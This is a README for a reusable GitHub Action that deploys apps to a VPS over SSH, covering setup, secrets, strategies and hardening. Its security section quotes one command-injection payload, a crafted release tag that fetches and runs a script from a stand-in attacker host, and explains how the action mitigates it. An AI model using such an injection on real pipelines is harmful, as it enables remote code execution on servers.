# Deploy to VPS

A reusable GitHub Action that deploys a project to a VPS over SSH — Node.js + Docker, Node.js + PM2, static sites, or any custom shell workflow.

**Intended for public use.** Drop the action into any repo via `mujeeb-enfin/git-actions@v1`; configure three secrets (`VPS_HOST`, `VPS_USERNAME`, `VPS_SSH_KEY`); publish a release.

> Looking for the consolidated developer checklist (required secrets, VPS prerequisites, scanner configuration, local tooling, versioning)? See [**`requirements.md`**](./requirements.md).

## Status

[![CI](https://github.com/mujeeb-enfin/git-actions/actions/workflows/test.yml/badge.svg)](../../actions/workflows/test.yml)
[![gitleaks](https://github.com/mujeeb-enfin/git-actions/actions/workflows/gitleaks.yml/badge.svg)](../../actions/workflows/gitleaks.yml)
[![OWASP](https://github.com/mujeeb-enfin/git-actions/actions/workflows/owasp.yml/badge.svg)](../../actions/workflows/owasp.yml)
[![Trivy](https://github.com/mujeeb-enfin/git-actions/actions/workflows/trivy.yml/badge.svg)](../../actions/workflows/trivy.yml)
[![SonarQube](https://github.com/mujeeb-enfin/git-actions/actions/workflows/sonarqube.yml/badge.svg)](../../actions/workflows/sonarqube.yml)
[![ZAP](https://github.com/mujeeb-enfin/git-actions/actions/workflows/zap.yml/badge.svg)](../../actions/workflows/zap.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

## What's in This Repo

| File | Purpose |
|---|---|
| `action.yml` | Reusable composite action — the deploy logic. Supports four strategies (`node-pm2`, `node-docker`, `static`, `custom`), dry-run mode, structured outputs, and a step summary. |
| `.github/workflows/release.yml` | `node-docker` example consumer (release trigger, default strategy). |
| `.github/workflows/release-pm2.yml` | `node-pm2` example consumer (release trigger). |
| `.github/workflows/branch.yml` | `node-docker` example consumer (push to `develop` branch). |
| `.github/workflows/test.yml` | CI: `actionlint` + `yamllint` + `shellcheck` on every push and PR. |
| `.github/workflows/gitleaks.yml` | Secret-scanning on every push, PR, and nightly. |
| `.github/workflows/owasp.yml` | OWASP Dependency-Check on every push, PR, and weekly. |
| `.github/workflows/trivy.yml` | Filesystem vuln + IaC + secret scan on every push, PR, and weekly. |
| `.github/workflows/sonarqube.yml` | Static analysis (requires `SONAR_TOKEN` secret). |
| `.github/workflows/zap.yml` | Passive URL scan (requires `SCAN_TARGET_URL` variable). |
| `.github/dependabot.yml` | Weekly GitHub Actions SHA-update PRs. |
| `.github/CODEOWNERS` | Required-reviewer routing. |
| `.github/CODE_OF_CONDUCT.md` | Contributor Covenant v2.1. |
| `.github/ISSUE_TEMPLATE/` | Structured bug-report and feature-request forms. |
| `.github/PULL_REQUEST_TEMPLATE.md` | PR checklist. |
| `.yamllint.yml` | Yamllint configuration used by `test.yml`. |
| `requirements.md` | Consolidated developer checklist (secrets, VPS prerequisites, scanners, local tooling, versioning). |
| `CHANGELOG.md` | Per-release notes (Keep a Changelog format). |
| `CONTRIBUTING.md` | PR conventions, commit format, coding standards. |
| `SECURITY.md` | Private vulnerability disclosure policy. |
| `LICENSE` | MIT. |
| `README.md` | This document. |

## Quick Start

> **Before you copy this:** replace `<your-project>` and `<your-pm2-app>` with the real values for your app, and make sure you've completed the [VPS prerequisites](#4-vps-prerequisites) for your chosen strategy.

```yaml
name: Deploy
on:
  release:
    types: [published]
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: mujeeb-enfin/git-actions@v1
        with:
          vps_host: ${{ secrets.VPS_HOST }}
          vps_username: ${{ secrets.VPS_USERNAME }}
          vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
          project_path: ~/projects/<your-project>
          strategy: node-pm2          # or: node-docker, static, custom
          pm2_app_name: <your-pm2-app>
          ref: ${{ github.event.release.tag_name }}
```

Set three secrets (`VPS_HOST`, `VPS_USERNAME`, `VPS_SSH_KEY`) and publish a release. That's it.

> ⚠️ **Note on `@v1`:** This ref resolves only after the maintainer tags a `v1.x.x` release in this repo. Until then, pin to a specific commit SHA (see [requirements.md](requirements.md) §6).

---

## Strategies

The action supports **four deploy strategies** selectable via the `strategy` input:

| Strategy | Use when |
|---|---|
| `node-pm2` | A plain Node.js app managed by PM2 on the VPS. |
| `node-docker` *(default)* | A Node.js app running in Docker / Compose on the VPS. |
| `static` | A pre-built static site served by nginx / caddy / etc. |
| `custom` | Anything else (Django, Go, Rails, Rust, PHP, …) — provide your own shell. |

- **Trigger:** `release: published` (automatic) and `workflow_dispatch` (manual)
- **Runner:** `ubuntu-latest`
- **Transport:** SSH into the VPS using [`appleboy/ssh-action`](https://github.com/appleboy/ssh-action) pinned to commit `029f5b4aeeeb58fdfe1410a5d17f967dacf36262`
- **Hardened by default:** minimal token permissions, concurrency control, fail-fast shell options, deterministic `npm ci`, environment-gated manual approvals, and shell-injection-safe tag handling.

## Security & Scans

This repository runs five security scanners on every push and PR. Each one is also scheduled to run on a weekly cadence so the CVE database stays fresh.

| Scanner | What it catches | Workflow |
|---|---|---|
| **[gitleaks](https://github.com/gitleaks/gitleaks)** | Hard-coded secrets, API keys, tokens, credentials in source or git history | [`.github/workflows/gitleaks.yml`](.github/workflows/gitleaks.yml) |
| **[OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)** | CVEs in third-party GitHub Actions and the embedded shell dependencies | [`.github/workflows/owasp.yml`](.github/workflows/owasp.yml) |
| **[Trivy](https://trivy.dev/)** | OS-package and library vulnerabilities, IaC misconfigurations in workflow YAML, secret leaks | [`.github/workflows/trivy.yml`](.github/workflows/trivy.yml) |
| **[SonarQube](https://www.sonarsource.com/)** | Static analysis — code smells, bugs, security hotspots across all YAML, shell, and Markdown files | [`.github/workflows/sonarqube.yml`](.github/workflows/sonarqube.yml) |
| **[OWASP ZAP](https://www.zaproxy.org/)** | Passive baseline scan against any live URL associated with the repo (set `vars.SCAN_TARGET_URL` to enable) | [`.github/workflows/zap.yml`](.github/workflows/zap.yml) |

### Optional scanner configuration

- **SonarQube** — set `SONAR_TOKEN` and `SONAR_HOST_URL` secrets to point at a SonarCloud project or your self-hosted server. The job will skip cleanly if these are absent.
- **ZAP** — set `vars.SCAN_TARGET_URL` (or `secrets.SCAN_TARGET_URL`) to the URL of any live site associated with the repo. The job is skipped when no target is configured.
- **OWASP / Trivy** — these run with sensible defaults. Tune severity thresholds or scanner lists in the workflow files.

### Reporting a vulnerability

Please do **not** open a public GitHub issue for security problems. Use GitHub's private vulnerability reporting (Security tab → Report a vulnerability) or email `security@mr-innovations.com`.

## License

[MIT](LICENSE) — © 2026 Mujeeb Rahman / MR INNOVATIONS.

---

## Maintainer

This action is published and maintained by **Mujeeb Rahman** — project manager by trade, software engineer at heart, and founder of **[MR INNOVATIONS](https://mr-innovations.com)**.

### Other products from MR INNOVATIONS

#### Developer tools
- [**MR CODER**](https://marketplace.visualstudio.com/items?itemName=mr-coder) — VS Code extension.
- [**mr-coder.io**](https://mr-coder.io) — companion site.
- [**codeshare.site**](https://codeshare.site) — share code snippets with a permalink.

#### Hosting
- [**cybrohosting.com**](https://cybrohosting.com) — managed hosting.

#### Webhooks
- [**paymenthooks.com**](https://paymenthooks.com) — payment webhook routing.
- [**evethooks.io**](https://evethooks.io) — event-driven webhook orchestration.
- [**emailhooks.io**](https://emailhooks.io) — email-event webhooks (delivered, opened, bounced).

#### APIs & data
- [**worldpostallocations.com**](https://worldpostallocations.com) — worldwide postal-code / address-allocation API.

#### Classifieds & marketplaces
- [**360classifieds.in**](https://360classifieds.in) — India classifieds platform.

#### Travel & hospitality
- [**hotelstack.io**](https://hotelstack.io) — hotel-tech stack for boutique properties.
- [**bookmyroom.io**](https://bookmyroom.io) — direct hotel-room booking engine.

---

## How It Works

```
┌──────────────────┐   release:published    ┌────────────────────┐
│  GitHub Release  │ ─────────────────────► │  GitHub Actions    │
│  (tag v1.2.3)    │                        │  runner (ubuntu)   │
└──────────────────┘                        └─────────┬──────────┘
                                                      │ SSH (VPS_SSH_KEY or VPS_PASSWORD)
                                                      ▼
                                           ┌──────────────────────┐
                                           │  Your VPS            │
                                           │  ──────────────      │
                                           │  1. git fetch + chk  │
                                           │  2. (optional)       │
                                           │     pre_deploy_cmds  │
                                           │  3. strategy branch  │
                                           │     node-pm2 /       │
                                           │     node-docker /    │
                                           │     static /         │
                                           │     custom           │
                                           └──────────────────────┘
```

> The strategy chosen via the `strategy:` input determines steps 3+ — see §6.

There are **two** SSH hops to think about:

1. **GitHub Actions → VPS** — authenticated using the secrets configured in §4 (key *or* password).
2. **VPS → GitHub** — the VPS pulls the repo using a dedicated read-only **Deploy Key** (see §3.4).

---

## Prerequisites

Make sure each of these is in place before continuing:

- A VPS running a recent Ubuntu (or any distro that can install NVM + Docker).
- Outbound HTTPS from the VPS (to GitHub and `raw.githubusercontent.com`).
- A GitHub repository with **Actions enabled** (Settings → Actions → General).
- A local machine with `ssh`, `ssh-keygen`, and (optionally) the [`gh` CLI](https://cli.github.com/).
- A user account on the VPS with `sudo` rights (we recommend a **non-root** deploy user).

---

## One-Time VPS Setup

Log in to the VPS as the user that will own the deployment:

```bash
ssh your-vps-user@<VPS_HOST>
```

### 3.1 Install NVM + Node.js 22

```bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

nvm install 22
nvm alias default 22
```

Verify:

```bash
command -v nvm && nvm --version && node --version   # should print v22.x
```

### 3.2 Install Docker + Compose V2

The workflow uses `docker compose …` (Compose **V2**, the plugin). Install it on Ubuntu:

```bash
sudo apt update
sudo apt install -y ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo $VERSION_CODENAME) stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io \
                   docker-buildx-plugin docker-compose-plugin
sudo usermod -aG docker $USER
newgrp docker
```

Verify:

```bash
docker --version
docker compose version
```

### 3.3 Create the project directory & clone the repo

The example workflow `release.yml` ships with `project_path: ~/projects/myapp`. Edit that line to match the directory you create here:

```bash
mkdir -p ~/projects/<your-project>
cd ~/projects/<your-project>

# Use SSH so the deploy key from §3.4 works automatically
git clone git@github.com:<owner>/<repo>.git .
```

Replace `<owner>/<repo>` with the source repository's GitHub path (the one whose releases trigger the deploy — usually the repo this action is invoked *from*, not the action's own repo).

### 3.4 Authorize the VPS to fetch from GitHub (Deploy Key)

The VPS needs to talk to GitHub to fetch the release tag. Use a dedicated read-only **Deploy Key**:

1. On the VPS, generate a keypair:

   ```bash
   ssh-keygen -t ed25519 -C "vps-deploy-key" \
              -f ~/.ssh/github_deploy -N ""
   ```

2. Print the public key:

   ```bash
   cat ~/.ssh/github_deploy.pub
   ```

3. On GitHub: **Repo → Settings → Deploy keys → Add deploy key**.
   - Title: `VPS deploy key`
   - Key: paste the contents of `github_deploy.pub`
   - ✅ Check **Allow write access** only if your workflow pushes back to the repo. For a one-way deploy, leave it **unchecked**.

4. Configure the SSH client on the VPS so GitHub always uses this key:

   ```bash
   cat >> ~/.ssh/config <<'EOF'
   Host github.com
     HostName github.com
     User git
     IdentityFile ~/.ssh/github_deploy
     IdentitiesOnly yes
   EOF
   chmod 600 ~/.ssh/config
   ```

5. Test it:

   ```bash
   ssh -T git@github.com
   # expected: "Hi <owner>/<repo>! You've successfully authenticated, but GitHub does not provide shell access."
   ```

### 3.5 Authorize GitHub Actions to SSH into the VPS

Pick **one** of the following methods.

#### Method A — SSH Key (recommended)

1. **On your local machine**, generate a keypair that GitHub Actions will use:

   ```bash
   ssh-keygen -t ed25519 -C "github-actions-deploy" \
              -f ./gha_vps_key -N ""
   ```

2. Copy the **public** key (`gha_vps_key.pub`) to the VPS and append it to the deploy user's `authorized_keys`:

   ```bash
   # from your local machine
   ssh-copy-id -i ./gha_vps_key.pub your-vps-user@<VPS_HOST>

   # OR, if ssh-copy-id isn't available:
   cat ./gha_vps_key.pub | ssh your-vps-user@<VPS_HOST> \
     "mkdir -p ~/.ssh && chmod 700 ~/.ssh && \
      cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
   ```

3. Keep `gha_vps_key` (the **private** key) safe — you will paste it into GitHub Secrets in §4.

#### Method B — Password (fallback only)

Use this only if you cannot use SSH keys. **Many VPS providers disable password SSH by default**, so you may need to enable it first.

1. On the VPS, ensure password auth is allowed and the user has a password:

   ```bash
   # /etc/ssh/sshd_config must contain:
   #   PasswordAuthentication yes
   sudo systemctl reload ssh
   sudo passwd your-vps-user
   ```

2. You will store this password in the GitHub secret `VPS_PASSWORD` (§4) and edit the workflow to use `password:` instead of `key:` (see §6).

### 3.6 VPS prerequisites per strategy

Install only what your chosen `strategy` requires.

| Strategy | Must be installed on the VPS |
|---|---|
| `node-pm2` | `nvm` + the chosen `node_version`, plus `npm i -g pm2` |
| `node-docker` | `nvm` + node, plus Docker + Compose V2 (see §3.1, §3.2) |
| `static` | `nginx` (or whatever you put in `reload_service`), `sudo` rights for the SSH user, plus `rsync` |
| `custom` | Whatever your `custom_script` invokes — no assumption is made by the action |

#### PM2 install (for `node-pm2`)

```bash
npm i -g pm2
pm2 -v   # confirm
```

You may also want to enable PM2 to start on boot:

```bash
pm2 startup   # follow the printed command, then:
pm2 save
```

#### nginx + sudo + rsync (for `static`)

```bash
sudo apt update && sudo apt install -y nginx rsync
# Add your deploy user to sudoers with NOPASSWD for systemctl/nginx commands only.
sudo visudo -f /etc/sudoers.d/deploy
# /etc/sudoers.d/deploy contents:
#   your-vps-user ALL=(ALL) NOPASSWD: /usr/bin/systemctl reload nginx
#   your-vps-user ALL=(ALL) NOPASSWD: /usr/bin/rsync
#   your-vps-user ALL=(ALL) NOPASSWD: /usr/bin/mkdir
```

> Restrict the `sudo` rules to exactly the commands the action needs. Do **not** give the deploy user blanket `NOPASSWD: ALL`.

---

## Configure GitHub Secrets

Go to **Repo → Settings → Secrets and variables → Actions → New repository secret** and add the secrets that match your chosen auth method.

| Secret          | Required for | Value                                                                 |
| --------------- | ------------ | --------------------------------------------------------------------- |
| `VPS_HOST`      | Both methods | IP or hostname of your VPS (e.g. `203.0.113.10` or `vps.example.com`).|
| `VPS_USERNAME`  | Both methods | The SSH user on the VPS (e.g. `deploy`).                              |
| `VPS_SSH_KEY`   | Key method   | Full PEM contents of `gha_vps_key` (private key), **including** `-----BEGIN OPENSSH PRIVATE KEY-----` and `-----END …-----` lines. |
| `VPS_PASSWORD`  | Password method | The SSH password for `VPS_USERNAME`.                               |

#### Tips for pasting multi-line secrets

- In the GitHub web UI, paste the key into the "Secret" field exactly as the file looks. The UI preserves newlines.
- From the CLI it's safer:

  ```bash
  gh secret set VPS_SSH_KEY < ./gha_vps_key
  ```

- Whichever method you use, **do not** strip the `BEGIN`/`END` lines or base64-encode the key.

> 🔐 If you also use the password method, store the password under `VPS_PASSWORD`. Because the shipped workflow only reads `VPS_SSH_KEY`, you must tweak the step as described in [§6](#configuration-youll-likely-want-to-change).

---

## How to Deploy

### 5.1 Automatic — publish a GitHub Release

```bash
# 1. Tag the commit you want to deploy
git tag v1.2.3
git push origin v1.2.3

# 2. Publish the release (triggers the workflow)
gh release create v1.2.3 --generate-notes --title "v1.2.3"
```

The Actions tab will show a "Deploy to VPS" run. Once it finishes green, the new tag is live on the VPS.

### 5.2 Manual — from the Actions UI

1. Repo → **Actions** → "Deploy to VPS".
2. Click **Run workflow** → pick the branch → **Run**.

This bypasses the release requirement and deploys whatever is on the chosen branch (`main` by default). Useful for hot-fixes or testing the pipeline without cutting a release.

---

## Configuration You'll Likely Want to Change

### Migrating from the old Node + Docker default

Existing consumers who do not change their workflow keep getting the Node + Docker flow — `strategy` defaults to `node-docker`. To switch to PM2, add `strategy: node-pm2` and `pm2_app_name: <your-process>`. To switch to a static or custom deploy, add the appropriate `strategy:` value and the matching inputs.

### Choose a strategy

#### `node-pm2` — plain Node.js app with PM2

```yaml
- uses: mujeeb-enfin/git-actions@v1
  with:
    vps_host: ${{ secrets.VPS_HOST }}
    vps_username: ${{ secrets.VPS_USERNAME }}
    vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
    project_path: ~/projects/api
    strategy: node-pm2
    pm2_app_name: api
    node_version: '22'
    ref: ${{ github.event.release.tag_name || github.ref_name }}
```

#### `node-docker` — Node.js in Docker Compose (default)

```yaml
- uses: mujeeb-enfin/git-actions@v1
  with:
    vps_host: ${{ secrets.VPS_HOST }}
    vps_username: ${{ secrets.VPS_USERNAME }}
    vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
    project_path: ~/projects/web
    strategy: node-docker
    compose_file: compose.prod.yaml   # optional; falls back to docker-compose.yml / compose.yaml
    node_version: '22'
    ref: ${{ github.event.release.tag_name || github.ref_name }}
```

#### `static` — pre-built static site served by nginx / caddy

```yaml
- uses: mujeeb-enfin/git-actions@v1
  with:
    vps_host: ${{ secrets.VPS_HOST }}
    vps_username: ${{ secrets.VPS_USERNAME }}
    vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
    project_path: ~/projects/marketing-site
    strategy: static
    static_source_dir: out        # Next.js static export
    static_output_dir: /var/www/html
    reload_service: nginx
    ref: ${{ github.event.release.tag_name || github.ref_name }}
```

#### `custom` — escape hatch (Django / Go / Rails / PHP / …)

```yaml
- uses: mujeeb-enfin/git-actions@v1
  with:
    vps_host: ${{ secrets.VPS_HOST }}
    vps_username: ${{ secrets.VPS_USERNAME }}
    vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
    project_path: ~/projects/django-app
    strategy: custom
    pre_deploy_commands: |
      cp .env.production .env
      python3 -m venv .venv
    custom_script: |
      source .venv/bin/activate
      pip install -r requirements.txt
      python manage.py migrate --noinput
      python manage.py collectstatic --noinput
      sudo systemctl restart gunicorn
    ref: ${{ github.event.release.tag_name || github.ref_name }}
```

> ⚠️ `custom_script` runs with the full privileges of the SSH user on the VPS — review §7.5 before using it.

### Using the example workflow files

This repo ships three ready-to-copy workflow files under `.github/workflows/`. Pick the one that matches your setup, copy it into your own repo, and edit the marked fields.

#### Which example should I copy?

| Example | Use when | Trigger | Strategy |
|---|---|---|---|
| **`release.yml`** | You cut a GitHub Release to deploy (recommended for production). | `release: published` + `workflow_dispatch` | `node-docker` |
| **`release-pm2.yml`** | Same as above, but for plain Node apps managed by PM2. | `release: published` + `workflow_dispatch` | `node-pm2` |
| **`branch.yml`** | Every push to `develop` should auto-deploy. | `push: branches: [develop]` | `node-docker` |

> **Not sure which to pick?** Start with `release.yml`. The release-trigger model is safer than push-to-branch because it requires an explicit `gh release create` (or click in the GitHub UI) to deploy.

#### Step-by-step

1. **Copy the file** into your own repo at `.github/workflows/deploy.yml` (you can rename it):

   ```bash
   mkdir -p .github/workflows
   curl -o .github/workflows/deploy.yml \
     https://raw.githubusercontent.com/mujeeb-enfin/git-actions/v1/.github/workflows/release.yml
   ```

2. **Edit the placeholder values** in the file you just copied. The lines you'll almost certainly need to change:

   | Field | What to put |
   |---|---|
   | `uses: mujeeb-enfin/git-actions@v1` | Already correct — leave it. |
   | `project_path:` | The absolute or `~`-relative path on the VPS where your code lives. E.g. `~/projects/myapp`. |
   | `strategy:` | `node-pm2`, `node-docker`, `static`, or `custom`. |
   | `pm2_app_name:` (PM2 only) | The name you registered with `pm2 start`. E.g. `myapp`. |
   | `compose_file:` (Docker only) | Optional. Defaults to `compose.yaml`. |
   | `node_version:` | The Node major version installed on the VPS. Default `22`. |
   | `branches: [develop]` (branch.yml only) | The branch name that should trigger deploys. |

3. **Set the three required secrets** in your repo (Settings → Secrets and variables → Actions):

   | Secret | Value |
   |---|---|
   | `VPS_HOST` | Your VPS hostname or IP. |
   | `VPS_USERNAME` | The SSH user on the VPS. |
   | `VPS_SSH_KEY` | The full PEM private key (paste including `-----BEGIN OPENSSH PRIVATE KEY-----` and `-----END …-----` lines). |

4. **Provision the VPS** following §3 above. Each strategy has its own prerequisites (NVM, Docker, PM2, nginx).

5. **Trigger a deploy**:

   - For `release.yml` / `release-pm2.yml`: `git tag v0.1.0 && git push origin v0.1.0 && gh release create v0.1.0 --generate-notes --title "v0.1.0"`.
   - For `branch.yml`: just `git push origin develop`.
   - For any of them: click **Run workflow** in the Actions tab.

#### Writing your own workflow

If none of the examples fit, write your own from scratch. The minimum you need:

```yaml
name: Deploy
on:                          # pick your trigger
  push:
    branches: [main]
permissions:
  contents: read             # minimum scope
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # optional, for required-reviewer gating
    concurrency: deploy-${{ github.ref }}
    steps:
      - uses: mujeeb-enfin/git-actions@v1
        with:
          vps_host: ${{ secrets.VPS_HOST }}
          vps_username: ${{ secrets.VPS_USERNAME }}
          vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
          project_path: ~/projects/<your-project>
          strategy: <node-pm2 | node-docker | static | custom>
          # ...strategy-specific inputs from the table below...
```

Refer to the [All inputs](#all-inputs) table for the full set of options.

### All inputs

| Input | Required | Default | Applies to | Notes |
|---|---|---|---|---|
| `vps_host` | yes | — | all | |
| `vps_username` | yes | — | all | |
| `vps_ssh_key` | yes | — | all | |
| `project_path` | yes | — | all | |
| `ref` | no | `''` | all | Must be set by caller (release tag or branch). |
| `ssh_command_timeout` | no | `30` | all | Minutes. |
| `strategy` | no | `node-docker` | all | One of `node-pm2`, `node-docker`, `static`, `custom`. |
| `pre_deploy_commands` | no | `''` | all | Multiline. Runs after checkout, before strategy. |
| `skip_install` | no | `false` | `node-pm2`, `node-docker` | |
| `skip_build` | no | `false` | `node-pm2`, `node-docker` | |
| `node_version` | no | `22` | `node-pm2`, `node-docker` | |
| `pm2_app_name` | no | `app` | `node-pm2` | |
| `install_command` | no | `npm ci --no-audit --no-fund` | `node-pm2`, `node-docker` | Falls back to `npm install` if no lockfile. |
| `build_command` | no | `npm run build` | `node-pm2`, `node-docker` | Empty string skips. |
| `compose_file` | no | `compose.yaml` | `node-docker` | Falls back to `docker-compose.yml`. |
| `static_source_dir` | no | `dist` | `static` | Relative to `project_path`. |
| `static_output_dir` | no | `/var/www/html` | `static` | |
| `reload_service` | no | `nginx` | `static` | Empty skips reload. |
| `custom_script` | no | `''` | `custom` | Required when `strategy=custom`. |

---

## Security Notes

### 7.1 Shell-injection risk via `tag_name` — already mitigated

GitHub release tags are user-controlled, so a maliciously crafted tag such as `"; curl http://evil.example/x.sh | bash #"` could otherwise execute arbitrary commands on the VPS as the SSH user. The shipped workflow and action already pass the tag through an `env:` variable and quote it in the shell, so this attack is **not** possible out of the box.

If you copy the workflow elsewhere and re-introduce raw `${{ github.event.release.tag_name }}` interpolation into `script: |`, please switch it back to the `env:`-based pattern shown in §7.2.

### 7.2 Recommended pattern (already applied in this repo)

```yaml
- uses: mujeeb-enfin/git-actions@v1
  env:
    TAG: ${{ github.event.release.tag_name || github.ref_name }}
  with:
    vps_host: ${{ secrets.VPS_HOST }}
    vps_username: ${{ secrets.VPS_USERNAME }}
    vps_ssh_key: ${{ secrets.VPS_SSH_KEY }}
    project_path: ~/projects/<your-project>
    node_version: '22'
    ref: ${{ env.TAG }}
```

The composite action then quotes the value internally: `git checkout "$REF"`.

### 7.3 Other hardening baked in

- **`permissions: contents: read`** — the workflow token can only read repo contents.
- **`concurrency: deploy-<ref>` with `cancel-in-progress: false`** — overlapping deploys are queued, not parallel; in-flight deploys finish.
- **`set -euo pipefail`** — the remote script exits immediately on any error, unset variable, or pipeline failure.
- **`command_timeout: 30m`** — caps the SSH session so a hung build can't run forever.
- **`npm ci --no-audit --no-fund`** — deterministic, fast installs intended for CI.
- **`environment: production`** — optional GitHub Environment for required-reviewer approval before deploys.

### 7.4 Other recommendations

- **Pin action versions to a commit SHA** for supply-chain safety. This repo's `action.yml` pins `appleboy/ssh-action` to `029f5b4aeeeb58fdfe1410a5d17f967dacf36262`. Avoid the `@vN` tag-ref pattern in your own workflows — use the full 40-character commit SHA instead. Tag refs can be moved by the maintainer.
- **Least privilege.** Use a dedicated, non-root user on the VPS for deployments.
- **Restrict who can publish releases.** Anyone with repo write access can publish a Release and therefore trigger a deploy. Use branch protection + a small trusted maintainer group.
- **Rotate secrets periodically.** Rotate `VPS_SSH_KEY` and the VPS→GitHub deploy key every 6–12 months. Zero-downtime rotation:
  1. Add the new key (`github_deploy_v2.pub` as a new Deploy Key on GitHub; new `gha_vps_key_v2` to the VPS's `authorized_keys`).
  2. Update `VPS_SSH_KEY` to the new private key.
  3. Trigger a manual deploy and confirm success.
  4. Remove the old keys.
- **Audit your tags.** Prefer the simple convention `vX.Y.Z` and reject anything else via protected-tags rules or CODEOWNERS.

### 7.5 `custom_script` is user-controlled

The shell snippet you pass via `custom_script` runs in the SSH session with the full privileges of the SSH user on the VPS — including any `sudo` rights that user has. Treat `custom_script` like you would treat a `run:` block on a self-hosted runner: assume it can read every secret in scope and modify any file the user can. Prefer `node-pm2`, `node-docker`, or `static` whenever they fit; reserve `custom` for cases they genuinely don't cover. Review the calling workflow in your repository before merging.

---

## Troubleshooting

| Symptom                                            | Likely cause                                          | Fix                                                                                                         |
| -------------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `Permission denied (publickey)` when the workflow runs | `VPS_SSH_KEY` not authorized on VPS, or newlines stripped in the secret | Re-authorize the public key on the VPS; re-paste the full PEM (including `BEGIN`/`END` lines).                 |
| `docker: command not found` / `docker-compose` (v1) error | Compose v1 is installed, v2 is missing                 | Install `docker-compose-plugin` (see §3.2). The workflow uses **v2** (`docker compose`, not `docker-compose`). |
| `nvm: command not found` inside the SSH script     | NVM not installed at `~/.nvm` for the SSH user         | Re-run §3.1 under the **same user** the workflow SSHes as.                                                   |
| `git fetch` from VPS fails with `Permission denied (publickey)` | Deploy key missing or wrong repo                      | Re-add `~/.ssh/github_deploy.pub` as a Deploy Key on the right repo (§3.4).                                 |
| `git checkout` fails: `pathspec … did not match`   | Tag not pushed yet, or typo in tag name               | `git ls-remote --tags origin` on the VPS to list actual tags.                                               |
| Workflow "succeeds" but the site is still down     | No health check after `docker compose up -d --build`  | Append `docker compose ps` and/or a curl to your health endpoint; treat a non-running container as failure.   |
| Password method refuses connection                 | VPS provider disabled password SSH                    | Enable `PasswordAuthentication yes` in `/etc/ssh/sshd_config` and `sudo systemctl reload ssh`.              |
| Workflow run shows "deploy" job but it never starts | Repository has Actions disabled                       | Settings → Actions → General → Allow all actions.                                                            |

---

## Related Files

- [`action.yml`](./action.yml) — the reusable composite action.
- [`.github/workflows/release.yml`](./.github/workflows/release.yml) — `node-docker` example consumer (release trigger, default strategy).
- [`.github/workflows/release-pm2.yml`](./.github/workflows/release-pm2.yml) — `node-pm2` example consumer (release trigger).
- [`.github/workflows/branch.yml`](./.github/workflows/branch.yml) — `node-docker` example consumer (push to `develop` branch).
- [`requirements.md`](./requirements.md) — consolidated checklist for developers: secrets, VPS prerequisites, scanner configuration, local tooling, versioning model.

## External References

- [GitHub Actions — Events that trigger workflows (`release`)](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#release)
- [`appleboy/ssh-action`](https://github.com/appleboy/ssh-action)
- [GitHub Docs — Managing deploy keys](https://docs.github.com/en/developers/overview/managing-deploy-keys#deploy-keys)
- [GitHub Docs — Encrypted secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [NVM](https://github.com/nvm-sh/nvm)
- [Docker Compose V2](https://docs.docker.com/compose/compose-v2/)